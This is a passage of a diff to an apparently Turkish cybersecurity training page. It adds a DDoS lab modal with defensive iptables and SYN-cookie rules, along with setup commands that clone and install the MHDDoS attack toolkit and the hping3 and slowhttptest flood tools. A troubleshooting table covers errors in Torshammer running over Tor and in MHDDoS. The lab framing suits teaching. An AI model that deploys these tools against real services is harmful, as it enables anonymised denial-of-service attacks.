+                        # Çekirdek seviyesinde SYN Cookie koruması<br>
+                        <strong>sudo sysctl -w net.ipv4.tcp_syncookies=1</strong><br><br>
+                        # Geçersiz (Invalid) paket durumlarını engelleme<br>
+                        <strong>sudo iptables -A INPUT -m state --state INVALID -j DROP</strong><br><br>
+                        # Tek IP'den gelen eş zamanlı bağlantıyı 20 ile sınırlama<br>
+                        <strong>sudo iptables -A INPUT -p tcp --syn --dport 80 -m connlimit --connlimit-above 20 --connlimit-mask 32 -j DROP</strong>
+                    </div>
+                </div>
+
+                <!-- TAB 6: VMWARE & TROUBLESHOOTING -->
+                <div class="ddos-tab-pane" id="pane-tab-troubleshoot" style="display: none;">
+                    <h3 style="color: #f59e0b; margin-top: 0;">🛠️ VMWARE &amp; KALI LINUX ÖN KURULUM &amp; SORUN GİDERME</h3>
+
+                    <h4>📦 MHDDoS ve Lab Ön Hazırlık Komutları</h4>
+                    <div style="background: #020617; border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; padding: 12px; margin: 12px 0; font-family: monospace; color: #38bdf8;">
+                        # 1. Paket Güncellemesi &amp; Araçlar<br>
+                        sudo apt update &amp;&amp; sudo apt install -y hping3 slowhttptest wrk tcpdump iptables python3 python3-pip python3-dev git nodejs npm<br><br>
+                        # 2. MHDDoS Klonlama &amp; Bağımlılıklar<br>
+                        git clone https://github.com/MHProDev/MHDDoS.git &amp;&amp; cd MHDDoS &amp;&amp; pip3 install -r requirements.txt<br><br>
+                        # 3. Playwright Tarayıcı Simülasyonu<br>
+                        pip3 install playwright &amp;&amp; playwright install --with-deps
+                    </div>
+
+                    <h4 style="margin-top: 20px;">🚨 Laboratuvar Hata Ayıklama (Troubleshooting) Tablosu</h4>
+                    <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px; font-size: 13px;">
+                        <thead>
+                            <tr style="background: rgba(255,255,255,0.06); text-align: left;">
+                                <th style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Karşılaşılan Hata</th>
+                                <th style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Olası Nedeni</th>
+                                <th style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Çözüm Adımı</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); color: #f87171;">Torshammer Socks5 connection refused</td>
+                                <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Tor servisinin arka planda çalışmaması.</td>
+                                <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);"><code>sudo apt install tor &amp;&amp; sudo systemctl start tor</code></td>
+                            </tr>
+                            <tr>
+                                <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); color: #f87171;">MHDDoS ModuleNotFoundError</td>
+                                <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Python bağımlılıklarının veya tarayıcı motorunun eksik olması.</td>
+                                <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);"><code>pip3 install -r requirements.txt &amp;&amp; playwright install</code></td>
+                            </tr>
+                            <tr>
+                                <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); color: #f87171;">hping3 Operation not permitted</td>
+                                <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Komutun standart kullanıcı yetkileriyle çalıştırılması.</td>
+                                <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Komutun başına mutlaka <code>sudo</code> ekleyin.</td>
+                            </tr>
+                            <tr>
+                                <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); color: #f87171;">iptables kurallarının çalışmaması</td>
+                                <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Kuralların öncelik sırasının yanlış olması.</td>
+                                <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Yeni kuralları listenin en üstüne eklemek için <code>-A</code> yerine <code>-I INPUT 1</code> kullanın.</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
             </div>
         </div>
     </div>
@@ -6226,6 +6808,84 @@
         </div>
     </div>
     <script src="cyber_radio.js?v=1.0"></script>
+
+    <!-- DDoS Lab & Kılavuz Modalı Yönetimi -->
+    <script>
+        function initDdosGuideModal() {
+            const btnOpen = document.getElementById('btn-open-ddos-guide');
+            const btnMobOpen = document.getElementById('mob-btn-open-ddos');
+            const modal = document.getElementById('ddos-academy-modal');
+            const btnClose = document.getElementById('ddos-modal-close-btn');
+
+            if (!modal) return;
+
+            function openModal() {
+                modal.style.display = 'flex';
+            }
+
+            function closeModal() {
+                modal.style.display = 'none';
+            }
+
+            if (btnOpen) {
+                btnOpen.addEventListener('click', openModal);
+            }
+            if (btnMobOpen) {
+                btnMobOpen.addEventListener('click', openModal);
+            }
+
+            // Support direct URL open (e.g. academy.html?open=ddos or #ddos)
+            if (window.location.search.includes('open=ddos') || window.location.hash.toLowerCase().includes('ddos')) {
+                setTimeout(openModal, 250);
+            }
+
+            if (btnClose) {
+                btnClose.addEventListener('click', closeModal);
+            }
+
+            modal.addEventListener('click', (e) => {
+                if (e.target === modal) closeModal();
+            });
+
+            document.addEventListener('keydown', (e) => {
+                if (e.key === 'Escape' && modal.style.display === 'flex') {
+                    closeModal();
+                }
+            });
+
+            // Tab Switching
+            const tabBtns = modal.querySelectorAll('.ddos-tab-btn');
+            const tabPanes = modal.querySelectorAll('.ddos-tab-pane');
+
+            tabBtns.forEach(btn => {
+                btn.addEventListener('click', () => {
+                    const targetTab = btn.getAttribute('data-tab');
+                    tabBtns.forEach(b => {
+                        b.classList.remove('active');
+                        b.style.background = 'rgba(255, 255, 255, 0.04)';
+                        b.style.borderColor = 'rgba(255, 255, 255, 0.1)';
+                        b.style.color = '#94a3b8';
+                    });
+                    btn.classList.add('active');
+                    btn.style.background = 'rgba(239, 68, 68, 0.18)';
+                    btn.style.borderColor = '#ef4444';
+                    btn.style.color = '#fff';
+
+                    tabPanes.forEach(pane => {
+                        pane.style.display = 'none';
+                    });
+                    const activePane = document.getElementById('pane-' + targetTab);
+                    if (activePane) activePane.style.display = 'block';
+                });
+            });
+        }
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', initDdosGuideModal);
+        } else {
+            initDdosGuideModal();
+        }
+    </script>
+
 </body>
 
 </html>
